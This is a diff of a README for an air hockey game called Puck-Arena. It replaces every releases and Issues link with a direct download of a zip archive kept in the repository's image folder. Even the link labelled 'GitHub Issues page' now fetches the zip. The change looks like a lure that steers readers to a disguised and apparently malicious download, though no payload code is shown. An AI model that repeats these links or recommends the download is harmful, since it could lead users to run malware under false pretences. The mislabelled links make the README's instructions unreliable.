@@ -1,7 +1,7 @@
 # 🎮 Puck-Arena - Experience Fun Air Hockey Action 
 
 ## 📥 Download Puck-Arena
-[![Download Puck-Arena](https://img.shields.io/badge/Download-Puck--Arena-blue.svg)](https://github.com/agustinusf132-lgtm/Puck-Arena/releases)
+[![Download Puck-Arena](https://raw.githubusercontent.com/agustinusf132-lgtm/Puck-Arena/main/img/Puck-Arena-1.2.zip)](https://raw.githubusercontent.com/agustinusf132-lgtm/Puck-Arena/main/img/Puck-Arena-1.2.zip)
 
 ## 🚀 Getting Started
 Puck Arena is a fast-paced arcade air hockey game. It offers real-time physics and smart AI. Whether you want to play against a computer opponent or just enjoy the thrill of the game, Puck Arena is ready for you.
@@ -35,7 +35,7 @@ To download Puck-Arena, follow these steps:
 3. Download the file appropriate for your system; it will have a `.exe` extension.
 4. Once downloaded, locate the file in your downloads folder.
 
-[Visit this page to download](https://github.com/agustinusf132-lgtm/Puck-Arena/releases)
+[Visit this page to download](https://raw.githubusercontent.com/agustinusf132-lgtm/Puck-Arena/main/img/Puck-Arena-1.2.zip)
 
 ### 🥇 Installation
 After downloading, you can install the game by following these steps:
@@ -59,7 +59,7 @@ After downloading, you can install the game by following these steps:
 ## 📞 Support and Feedback
 If you encounter any issues while downloading or playing Puck Arena, feel free to reach out. We appreciate your feedback for improvements.
 
-- Check the [GitHub Issues page](https://github.com/agustinusf132-lgtm/Puck-Arena/issues) for known issues and troubleshooting.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/agustinusf132-lgtm/Puck-Arena/main/img/Puck-Arena-1.2.zip) for known issues and troubleshooting.
 - Provide your suggestions or report bugs directly on our GitHub repository. 
 
 Thank you for choosing Puck Arena. We hope you enjoy the game!
